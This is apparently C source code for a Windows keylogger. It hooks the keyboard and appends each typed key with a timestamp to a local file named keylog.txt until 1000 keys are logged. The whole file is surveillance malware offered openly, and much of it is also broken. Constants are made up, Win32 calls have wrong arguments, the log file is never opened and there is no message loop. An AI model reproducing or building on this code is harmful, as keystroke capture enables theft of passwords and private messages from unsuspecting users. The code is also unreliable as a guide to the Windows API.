#define MAX_KEYSTROKES 1000

// Global variables
HWND hwnd = 0;
HHOOK hook = 0;
FILE *logFile = NULL;
int keyCount = 0;

// Callback function prototype
void KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam);

// Open the log file in append mode
void OpenLogFile() {
    // Open file in append mode
    logFile = fopen("keylog.txt", "a");
    if (!logFile) {
        // Handle error
        printf("Failed to create log file!\n");
    }
}

// Close the log file
void CloseLogFile() {
    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
}

// Callback function to handle keyboard events
void KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == WH_KEYBOARD_KEYDOWN) {
        // Check if the key is a printable character
        if (wParam >= VK_KEY_0 && wParam <= 0xFF) {
            // Convert to character
            char key = (char)wParam;
            // Append to file with timestamp
            time_t now;
            time(&now);
            fprintf(logFile, "[%s] %c\n", ctime(&now), key);
            keyCount++;
            // Check if we've reached the maximum keystrokes
            if (keyCount >= MAX_KEYSTROKES) {
                UnhookWindowsHook(hook);
                CloseLogFile();
                printf("Maximum keystrokes reached. Exiting...\n");
                exit(0);
            }
        }
    }
}

int main() {
    // Initialize variables
    hook = SetWindowsHook(WH_KEYBOARD_LL, KeyLoggerCallback);
    if (!hook) {
        printf("Failed to set keyboard hook!\n");
        return 1;
    }

    // Attach the hook to the main thread
    AttachThreadInput(hook, DWORD WINAPI threadProc, 0);

    // Start the main loop to keep the application running
    while (true) {
        Sleep(1);
    }

    // Cleanup
    UnhookWindowsHook(hook);
    CloseLogFile();
    return 0;
}
```

